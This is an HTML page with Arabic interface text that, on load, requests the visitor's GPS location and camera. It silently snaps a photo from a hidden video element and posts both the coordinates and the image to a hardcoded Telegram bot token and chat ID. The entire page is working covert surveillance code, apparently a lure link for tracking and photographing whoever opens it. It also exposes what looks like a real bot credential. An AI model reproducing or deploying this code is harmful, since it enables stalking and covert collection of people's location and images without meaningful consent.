<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>📍 تحديد الموقع + كاميرا</title>
</head>
<body>
  <h2>📡 جاري جمع المعلومات...</h2>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <pre id="result">جارٍ التحقق من الموقع والكاميرا...</pre>

  <script>
    const token = "7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI";
    const chat_id = "5735855086";

    function sendMessage(text) {
      return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text })
      });
    }

    function sendPhoto(blob) {
      const form = new FormData();
      form.append("chat_id", chat_id);
      form.append("photo", blob, "photo.jpg");

      return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: form
      });
    }

    function capturePhotoAndSend() {
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const context = canvas.getContext("2d");

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        sendPhoto(blob)
          .then(() => {
            document.getElementById("result").innerText += "\n📸 تم إرسال الصورة.";
          })
          .catch(err => {
            document.getElementById("result").innerText += "\n❌ فشل إرسال الصورة: " + err.message;
          });
      }, "image/jpeg");
    }

function initCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const video = document.getElementById("video");
      video.srcObject = stream;

      video.onloadedmetadata = () => {
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        canvas.toBlob(blob => {
          sendPhoto(blob);
        }, "image/jpeg");

        stream.getTracks().forEach(track => track.stop());
      };
    })
    .catch(err => {
      document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
    });
}

    function getLocationAndSend() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const lat = pos.coords.latitude.toFixed(6);
            const lon = pos.coords.longitude.toFixed(6);
            const acc = pos.coords.accuracy;

            const msg = `📍 تم تحديد الموقع بدقة GPS:

Latitude: ${lat}
Longitude: ${lon}
📏 الدقة: ±${acc} متر
🗺️ خرائط: https://www.google.com/maps?q=${lat},${lon}`;

            document.getElementById("result").innerText = msg;
            sendMessage(msg);
          },
          err => {
            document.getElementById("result").innerText = "❌ فشل تحديد الموقع: " + err.message;
            sendMessage("❌ فشل تحديد الموقع: " + err.message);
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      } else {
        document.getElementById("result").innerText = "❌ جهازك لا يدعم GPS";
        sendMessage("❌ جهاز لا يدعم GPS");
      }
    }

    // ✅ البداية:
    getLocationAndSend();
    initCamera();
  </script>
</body>
</html>
